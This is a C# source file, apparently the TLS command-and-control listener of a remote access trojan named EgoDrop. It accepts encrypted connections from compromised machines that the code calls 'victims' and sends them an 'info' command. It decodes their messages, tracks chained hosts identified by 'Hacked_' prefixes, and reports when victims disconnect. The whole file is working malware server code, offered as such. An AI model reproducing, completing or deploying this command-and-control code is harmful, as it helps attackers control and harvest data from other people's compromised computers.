using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.Net;
using System.Net.Sockets;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Configuration;

namespace EgoDrop
{
    public class clsTlsListener : clsListener
    {
        private X509Certificate m_certificate { get; set; }
        private TcpListener m_listener { get; set; }

        public clsTlsListener(
            string szName, 
            int nPort, 
            string szDescription, 
            string szCertificatePath, 
            string szCertificatePassword
        )
        {
            m_szName = szName;
            m_nPort = nPort;
            m_szDescription = szDescription;
            m_Protocol = clsSqlite.enListenerProtocol.TLS;
            m_stListener = new clsSqlite.stListener(m_szName, m_Protocol, m_nPort, m_szName, DateTime.Now, szCertificatePath, szCertificatePassword);

            m_certificate = new X509Certificate(szCertificatePath, szCertificatePassword);
            m_listener = new TcpListener(IPAddress.Any, nPort);
        }

        public override void fnStart()
        {
            //base.fnStart();

            if (m_bIsListening)
            {
                MessageBox.Show($"Listener[{m_szName}] is already in used.", "fnStart()", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            Socket sktSrv = m_listener.Server;
            var hSafe = sktSrv.SafeHandle;
            if (sktSrv == null || hSafe == null || hSafe.IsInvalid || hSafe.IsClosed)
                m_listener = new TcpListener(IPAddress.Any, m_nPort);

            m_listener.Start();
            m_listener.BeginAcceptTcpClient(new AsyncCallback(fnAcceptCallback), m_listener);
            m_bIsListening = true;
        }

        public override void fnStop()
        {
            //base.fnStop();

            m_listener.Stop();
            m_bIsListening = false;
        }

        private void fnAcceptCallback(IAsyncResult ar)
        {
            if (ar == null || ar.AsyncState == null)
                return;

            TcpListener listener = (TcpListener)ar.AsyncState;
            Socket sktSrv = listener.Server;

            try
            {
                var hSafe = sktSrv.SafeHandle;
                if (!m_bIsListening || sktSrv == null || hSafe == null || hSafe.IsInvalid || hSafe.IsClosed)
                    return;

                listener.BeginAcceptTcpClient(new AsyncCallback(fnAcceptCallback), listener);

                TcpClient clnt = m_listener.EndAcceptTcpClient(ar);
                SslStream sslStream = new SslStream(clnt.GetStream(), false);
                sslStream.AuthenticateAsServer(m_certificate, false, false);

                clsVictim vicitm = new clsVictim(clnt.Client, sslStream, this);

                sslStream.BeginRead(vicitm.m_abBuffer, 0, vicitm.m_abBuffer.Length, new AsyncCallback(fnReadCallback), vicitm);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void fnReadCallback(IAsyncResult ar)
        {
            if (ar == null || ar.AsyncState == null)
                return;

            try
            {
                clsEDP edp = null;
                clsVictim victim = (clsVictim)ar.AsyncState;
                SslStream sslClnt = victim.m_sslClnt;

                int nRecvLength = 0;
                byte[] abStaticRecvBuffer = new byte[clsEDP.MAX_SIZE];
                byte[] abDynamicRecvBuffer = { };

                victim.fnSendCommand("info");

                do
                {
                    abStaticRecvBuffer = new byte[clsEDP.MAX_SIZE];
                    nRecvLength = sslClnt.Read(abStaticRecvBuffer, 0, abStaticRecvBuffer.Length);
                    abDynamicRecvBuffer = clsTools.fnabCombineBytes(abDynamicRecvBuffer, 0, abDynamicRecvBuffer.Length, abStaticRecvBuffer, 0, nRecvLength);

                    if (nRecvLength <= 0)
                        break;
                    else if (abDynamicRecvBuffer.Length < clsEDP.HEADER_SIZE)
                        continue;
                    else
                    {
                        var headerInfo = clsEDP.fnGetHeader(abDynamicRecvBuffer);
                        while (abDynamicRecvBuffer.Length - clsEDP.HEADER_SIZE >= headerInfo.nLength)
                        {
                            edp = new clsEDP(abDynamicRecvBuffer);
                            abDynamicRecvBuffer = edp.m_abMoreData;
                            headerInfo = clsEDP.fnGetHeader(abDynamicRecvBuffer);

                            byte[] abBuffer = edp.fnGetMsg().abMsg;

                            if (edp.m_nCommand == 0)
                            {
                                if (edp.m_nParam == 0)
                                {
                                    string szPlain = Encoding.UTF8.GetString(abBuffer);
                                    List<string> lsMsg = szPlain.Split('|').Select(x => clsEZData.fnB64D2Str(x)).ToList();

                                    List<string> lsVictim = new List<string>();
                                    for (int i = 0; i < lsMsg.Count; i++)
                                    {
                                        string s = lsMsg[i];
                                        if (s.StartsWith("Hacked_"))
                                        {
                                            lsVictim.Add(s);
                                        }
                                        else
                                        {
                                            lsMsg = lsMsg[i..];
                                            break;
                                        }
                                    }

                                    string szSrcVictimID = lsVictim.Last();

                                    fnOnReceivedMessage(victim, szSrcVictimID, lsMsg);

                                    if (lsMsg[0] == "info")
                                        fnOnAddChain(lsVictim);
                                }
                            }
                            else if (edp.m_nCommand == 1)
                            {
                                
                            }
                            else if (edp.m_nCommand == 2)
                            {
                                if (edp.m_nParam == 0)
                                {
                                    
                                }
                            }
                        }
                    }
                }
                while (nRecvLength > 0);

                fnOnVictimDisconnected(victim);
            }
            catch (Exception ex)
            {

            }
        }
    }
}
